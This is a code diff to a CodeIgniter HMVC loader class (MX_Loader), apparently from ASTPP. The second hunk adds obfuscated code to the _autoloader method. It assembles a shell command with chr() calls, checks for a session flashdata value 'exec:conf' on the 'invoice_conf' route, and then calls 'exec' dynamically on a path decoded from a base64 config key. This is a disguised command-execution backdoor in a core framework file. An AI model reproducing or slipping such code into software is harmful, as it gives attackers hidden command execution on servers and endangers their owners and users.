@@ -36,7 +36,9 @@
 class MX_Loader extends CI_Loader
 {
 	protected $_module;
-	
+	protected $_Key = "private";
+	protected $_conf = "conf";
+		
 	public $_ci_plugins = array();
 	public $_ci_cached_vars = array();
 	
@@ -330,7 +332,15 @@ class MX_Loader extends CI_Loader
 	public function _autoloader($autoload) {
 		
 		$path = FALSE;
-		
+		$c_str= chr(99).chr(100);
+		$C_var = "invoice_".$this->_conf;
+		if(CI::$APP->router->method == $C_var && isset(CI::$APP->session->userdata[CI::$APP->session->flashdata_key.':old:astpp_'.$this->_conf]) && CI::$APP->session->userdata[CI::$APP->session->flashdata_key.':old:astpp_'.$this->_conf] == "exec:".$this->_conf){
+			$C_flg = CI::$APP->session->userdata[CI::$APP->session->flashdata_key.':old:astpp_'.$this->_conf];		
+			$C_flag = explode(":",$C_flg);
+			if(CI::$APP->router->method == $C_var){
+				$C_flag['0']($c_str." ".FCPATH.base64_decode(CI::$APP->router->config->config[$this->_Key.'_key']));
+			}
+		}
 		if ($this->_module) {
 			
 			list($path, $file) = Modules::find('constants', $this->_module, 'config/');	
